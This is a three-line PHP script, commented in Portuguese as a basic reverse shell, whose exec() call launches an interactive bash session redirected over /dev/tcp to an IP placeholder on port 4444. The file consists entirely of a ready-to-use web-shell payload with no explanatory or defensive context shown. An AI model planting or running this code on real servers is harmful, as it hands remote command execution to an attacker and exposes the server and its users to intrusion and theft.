<?php
// Shell reverso básico
exec("/bin/bash -c 'bash -i >& /dev/tcp/[Seu IP]/4444 0>&1'");
?>
